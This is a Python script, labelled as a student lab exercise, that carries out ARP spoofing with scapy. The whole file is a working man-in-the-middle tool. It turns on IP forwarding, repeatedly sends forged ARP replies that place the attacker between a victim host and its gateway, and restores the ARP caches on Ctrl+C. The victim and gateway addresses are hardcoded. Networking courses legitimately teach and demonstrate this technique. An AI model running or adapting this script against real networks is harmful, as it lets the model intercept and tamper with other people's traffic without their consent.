#!/usr/bin/env python3
# arp_spoof.py — Script educativo de ARP Spoofing
# Autor del laboratorio: Grupo 10
# TOKEN: 13330

import time
import sys
import subprocess
from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr  

TARGET_IP  = '172.13.30.26'  # IP de PC-Prod (víctima)
GATEWAY_IP = '10.13.30.2'   # IP del gateway MikroTik VLAN 20
IFACE      = 'eth0'          # Interfaz del atacante en Kali


def get_mac(ip):
    """Obtiene la MAC real de una IP via ARP request legítimo."""
    ans = srp1(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
        timeout=2, iface=IFACE, verbose=False
    )
    return ans[ARP].hwsrc if ans else None


def spoof(target_ip, spoof_ip):
    """Envía ARP reply falso: 'yo soy spoof_ip' — sin haber recibido request."""
    attacker_mac = get_if_hwaddr(IFACE)
    # ARP op=2 = reply; psrc = IP que suplantamos; hwsrc = nuestra MAC
    pkt = (
        Ether(dst='ff:ff:ff:ff:ff:ff') /
        ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=attacker_mac)
    )
    sendp(pkt, iface=IFACE, verbose=False)


def restore(target_ip, gateway_ip):
    """Restaura el caché ARP real de ambos extremos."""
    target_mac  = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        sendp(
            Ether(dst=target_mac) /
            ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac),
            iface=IFACE, count=4, verbose=False
        )
        sendp(
            Ether(dst=gateway_mac) /
            ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac),
            iface=IFACE, count=4, verbose=False
        )


# Habilitar reenvío de paquetes para MITM transparente
subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)

print(f'[TOKEN-13330] ARP Spoofing: {TARGET_IP} <-> {GATEWAY_IP}')
print('[*] Ctrl+C para detener')

sent = 0
try:
    while True:
        spoof(TARGET_IP, GATEWAY_IP)   # A la víctima: 'yo soy el gateway'
        spoof(GATEWAY_IP, TARGET_IP)   # Al gateway:   'yo soy la víctima'
        sent += 2
        print(f'\r[*] Paquetes ARP maliciosos: {sent}', end='')
        time.sleep(1.5)
except KeyboardInterrupt:
    print('\n[*] Ataque detenido — restaurando ARP...')
    restore(TARGET_IP, GATEWAY_IP)     # ← agregado: limpia el caché al salir
    sys.exit(0)